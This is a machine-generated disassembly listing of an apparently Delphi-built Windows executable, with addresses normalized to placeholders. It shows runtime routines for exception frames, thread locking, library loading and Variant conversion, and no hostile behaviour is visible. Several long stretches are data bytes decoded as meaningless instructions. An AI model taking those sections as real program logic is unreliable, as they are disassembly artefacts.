lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_40402c
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404528
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_404388
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_4042c8
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_404528
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_4042d0
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042c8
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_404528
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_4042d0
jmp r-xdata
sub_40cfc8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40d058
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b1b4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d05f
lea eax [ ebp - 0x14 ]
call sub_404008
retn
sub_40d0b0
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408920
mov [ rw-data ] eax
sub_40d134
push ebx
push esi
push edi
push ebp
call sub_4035c0
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4027bc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403224
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a8
sub_40d19c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d184
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d224
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407f70
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40d124
mov [ ebp ] eax
sub_40d224
push ebx
mov ebx eax
mov eax ebx
call sub_40d184
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40d124
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d264
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_40d2d8
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
call sub_40d364
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403234
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_40d364
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d320
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d19c
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40d12c
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40d10c
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40d12c
test eax eax
je r-xdata
mov eax edi
call sub_40d320
test bl bl
je r-xdata
mov eax edi
call sub_40d354
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40d10c
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40d118
sub_40d400
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d19c
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40d12c
mov eax ebx
call sub_40d338
mov eax ebx
call sub_40d32c
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d214
sub_40d450
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d19c
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d344
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40d118
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40d10c
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d344
mov eax esi
call sub_40d338
sub_40d4bc
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d19c
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d214
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40d10c
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d338
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d338
sub_40d534
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d558
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d5cf
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405a38
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5d6
lea eax [ ebp - 0x4 ]
call sub_405a38
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032e8
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d534
test al al
jne r-xdata
mov al 0x1
sub_40d5f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d662
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d644
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4044c8
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d64b
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d674
sbb eax 0x4000000
jecxz r-xdata
inc edi
add ah dl
cli
add [ eax - 0x5 ] dh
inc edi
add ah bh
loop r-xdata
inc edi
add al cl
cld
inc edi
add [ edx ] ah
add [ eax ] ah
std
inc edi
add [ edx + 0x47 ] ch
add [ eax + 0x640047f9 ] bh
loop r-xdata
inc edi
add [ ecx + edi * 8 - 0x1d53ffb9 ] bl
add [ eax ] al
cli
inc edi
add ah dh
loop r-xdata
inc edi
add [ edi + esi * 8 + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add [ edx ] dl
inc edi
add [ ebx + edi * 8 + 0x47 ] bh
add [ eax ] al
adc dl ah
inc edi
add [ edi + esi * 8 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ edx ] cl
inc edi
add [ eax + edi * 8 + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] cl
loop r-xdata
add [ eax ] al
sbb al 0xe2
inc edi
add [ eax + 0x47fc ] ch
add [ eax ] al
add [ eax ] bl
loop r-xdata
inc edi
add [ ecx + edi * 8 + 0x280047 ] dh
add ah dl
cld
inc edi
add [ edx + 0x47 ] bl
add ah ch
cld
inc edi
add [ edx + 0x47 ] dl
add [ eax + edi * 8 - 0x1db3ffb9 ] cl
inc edi
inc edi
add [ edx - 0x65fffb9 ] bl
inc edi
add [ edx - 0x283ffb9 ] dl
inc edi
add ah cl
cld
inc edi
add [ eax - 0x5bffb807 ] ch
loop r-xdata
add [ eax - 0x9 ] dh
inc edi
add ah ch
loop r-xdata
inc edi
add [ eax ] dh
sti
inc edi
add [ eax ] al
add [ eax ] al
add al bh
loope r-xdata
inc edi
add [ eax - 0x8 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ edx ] al
inc edi
add [ eax + 0x47f7 ] ch
add [ eax ] al
add [ eax ] al
loop r-xdata
inc edi
add ah ah
sti
inc edi
add ah ah
loop r-xdata
inc edi
add [ eax ] al
stc
inc edi
add [ eax ] al
add [ eax ] al
add ah bl
loope r-xdata
inc edi
add [ eax + edi * 8 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add ah dh
loope r-xdata
inc edi
add [ eax ] bl
cld
inc edi
add [ eax ] al
add [ eax ] al
add al ch
loope r-xdata
inc edi
add [ eax + 0x47f9 ] dh
add [ eax ] al
add ah bh
loope r-xdata
inc edi
add [ eax - 0x6bffb807 ] ah
loop r-xdata
add [ esp + edi * 8 ] dh
inc edi
add ah bl
loop r-xdata
inc edi
add [ edx + edi * 8 + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add al al
loope r-xdata
inc edi
add [ eax ] ch
test [ edi ] 0x0
fsub st1
inc edi
add ah ch
cli
inc edi
add [ eax ] al
add [ eax ] al
add al dh
loope r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x77ffb81f ] ch
clc
inc edi
add [ eax ] al
inc edi
add al bh
cld
add [ edx + edi * 8 + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add al cl
loope r-xdata
inc edi
add al ch
clc
inc edi
add [ eax ] al
add [ eax ] al
add ah cl
loope r-xdata
add [ ebx + edi * 8 + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add ah ah
loope r-xdata
inc edi
add [ eax + 0x47f9 ] bl
add [ eax ] al
add al ah
loope r-xdata
inc edi
add [ eax + edi * 8 ] dl
inc edi
add [ edx + 0x47 ] al
add al bh
cli
inc edi
add [ edx ] bh
inc edi
add al bl
sti
inc edi
add [ edx ] dh
inc edi
add [ eax ] ah
test [ edi ] rw-data
enter 0x47fc 0x0
and al 0xe2
add [ edx - 0x4cbffb9 ] cl
add [ ebp + edi * 8 + 0x47 ] bh
inc edi
add [ eax - 0x2bffb808 ] dh
loop r-xdata
in al dx
xor eax eax
push ebp
push sub_40dab9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ edi + esi * 8 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x43ffb81f ] dl
cld
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x51bffb9 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x500047e1 ] cl
std
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + 0x47 ] ah
add ah al
stc
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x1f ] ah
inc edi
add [ eax + edi * 8 + 0x47 ] bl
add [ eax ] al
push ebp
mov ebp esp
add [ eax ] al
add [ ecx - 0x8c7ffb9 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x700047e1 ] ah
cld
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x243ffb9 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffb81f ] bl
test [ edi ] 0x0
xchg esp eax
loope r-xdata
inc edi
add [ eax + 0x47f8 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x7bffb81f ] dh
cld
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x517ffb9 ] ch
add [ ecx + edi * 8 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ ecx - 0x8dbffb9 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x13ffb81f ] bh
stc
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x307ffb9 ] dh
inc edi
add [ edi + esi * 8 ] ah
add [ edx + edi * 8 + 0x47 ] bl
add [ eax ] al
shl cl 0x1
inc edi
add [ esp + edi * 8 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add ah dl
loope r-xdata
add [ eax ] dh
cld
inc edi
add [ eax ] al
add [ eax ] al
add ah ch
loope r-xdata
inc edi
add [ esp + edi * 8 + 0x47 ] al
add [ eax ] al
lodsb [ esi ]
loope r-xdata
add [ eax ] dl
sti
inc edi
add [ eax ] al
add [ eax ] al
add ah al
loope r-xdata
inc edi
add [ edx - 0x4fbffb9 ] al
inc edi
add [ ebx + edi * 8 ] dh
add al ah
stc
inc edi
add ah cl
loop r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dac0
retn
mov eax rw-data
call sub_40d524
call sub_40d090
call sub_40c150
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40bc28 ]
call sub_404abc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
call sub_404008
mov eax rw-data
mov edx [ r-xdata ]
call sub_40538c
mov eax rw-data
mov edx [ r-xdata ]
call sub_40538c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404714
mov eax rw-data
call sub_404008
inc edi
add al ch
cli
inc edi
add [ edx + 0x47 ] bh
add [ eax + 0x740047fd ] dl
loop r-xdata
inc edi
add [ ebx + edi * 8 ] al
inc edi
add [ edx - 0x663ffb9 ] dh
inc edi
add [ edx - 0x657ffb9 ] ch
inc edi
add [ edx - 0x333ffb9 ] ah
add [ eax ] dl
test [ edi ] rw-data
pushad
cli
inc edi
add [ edx - 0x52bffb9 ] bh
sub_40dac4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40db2c
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db33
retn
mov eax sub_40d674
call sub_403d30
mov eax r-xdata
call sub_403d58
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c0cc
call sub_40c1d0
call sub_40d0b0
call sub_40cb14
mov eax rw-data
mov edx r-xdata
call sub_40405c
sub_40db6c
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40dbc0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dc1a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4084d4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc21
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40dc2c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dc86
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40986c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc8d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40dc98
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dcf2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409840
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dcf9
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40dd04
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dd5e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b128
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd65
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40dd70
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40ddca
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409898
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ddd1
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40dddc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40de49
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_4085e0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de50
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_40de5c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40debc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4097b8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404860
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dec3
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40decc
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40df2c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a8b4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404860
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df33
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40df3c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dfa0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_40867c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404860
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dfa7
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40dff0
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40e01c
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40db6c
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db9c
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db9c
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dba8
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dba8
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dba8
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dba8
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dba8
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dba8
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dba8
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dba8
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dba8
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbb4
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbc0
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc2c
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc98
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd04
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd70
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dddc
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de5c
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40decc
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40df3c
mov eax r-xdata
call sub_40dff0
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e328
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e34d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e354
retn
sub_40e4a2
inc [ eax ]
add [ eax ] al
add [ eax ] cl
push esi
popad
jb r-xdata
in al 0x40
add [ esi - 0x34ffbf1c ] bh
in al 0x40
add al bl
in al 0x40
popad
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx + 0x5c ] dl
mov dh 0x1c

int3
sub_40e52d
mov ebx 0x589e41a6
jg r-xdata
add al 0x8b
add bh bh
and [ ebx - 0xbfbdbbc ] al
jmp sub_415328
push ss
mov esi 0xe5082deb
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
in eax 0x40
add [ 0x40 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
in eax 0x40
add [ eax ] dl
add [ eax ] al
add [ eax + 0x7c0040e3 ] bh
xor al 0x40
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffec4125be
push ecx
inc ecx
add [ eax + 0x53 ] al
inc ecx
add [ edx + edx * 2 + 0x41 ] bh
add [ eax - 0x6fffbeae ] dh
push edx
inc ecx
add [ esi + edx * 2 + 0x52780041 ] bl
inc ecx
add [ eax ] ah
dec esi
inc ecx
add [ eax + 0x4e ] bl
inc ecx
add ah ah
dec esi
inc ecx
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
